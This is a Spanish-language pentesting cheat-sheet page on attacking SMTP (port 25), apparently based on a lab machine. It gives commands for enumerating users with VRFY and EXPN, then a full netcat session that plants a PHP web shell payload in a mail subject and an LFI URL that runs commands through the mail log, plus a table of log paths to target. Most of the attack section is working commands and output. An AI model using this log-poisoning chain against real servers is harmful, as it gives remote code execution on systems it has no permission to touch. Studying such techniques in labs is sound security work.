---
title: "SMTP (25)"
layout: "single"
category: "Servicios"
slug: "servicios/smtp"
date: "2025-11-26"
---

### Enumeración de Usuarios
```bash
nc -nv <IP> 25
VRFY root
EXPN admin
```
O usa `auxiliary/scanner/smtp/smtp_enum`.

### SMTP Log Poisoning

Se puede acontecer un RCE si podemos combinar un LFI con SMTP Log Poisoning. Ocurre cuando enviamos un código malicioso al mail (normalmente en php), esto se registra en un log, y podemos leerlo desde el navegador gracias  al LFI, el navegador verá el PHP y lo interpretará, dando lugar a un RCE o Reverse Shell.

##### Requisitos
* Vulnerabilidad LFI
* Servicio SMTP
* Conocer el usuario al que se envía (es útil aunque no imprescindible)
* Que el usuario www-data tenga lectura sobre los logs
* El servicio web pueda interpretar PHP

##### Ejemplo 
* Ejemplo de como enviar el mail envenenado:

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -vn 192.168.118.130 25
(UNKNOWN) [192.168.118.130] 25 (smtp) open
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: glmbxecurity
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: <?php system($_GET['cmd']); ?>
.
250 2.0.0 Ok: queued as C1935406AE
QUIT
221 2.0.0 Bye
```

* Ejecucion de comandos via LFI
```bash
http://192.168.118.130/insecure.php?file=/var/log/mail.log&cmd=id
```

##### Rutas comunes de logs SMTP
| Ruta                   | Descripcion                                    |
| ---------------------- | ---------------------------------------------- |
| `/var/log/mail.log`    | Estándar en sistemas basados en Debian/Ubuntu  |
| `/var/log/maillog`     | Estándar en sistemas RHEL/CentOS/Fedora.       |
| `/var/mail/root`       | Buzón local del usuario root.                  |
| `/var/mail/user`       | Buzón local del usuario user                   |
| `/var/mail/www-data`   | Buzón local del usuario web (si tiene correo). |
| `/var/spool/mail/root` | Otra ubicación común para buzones locales.     |




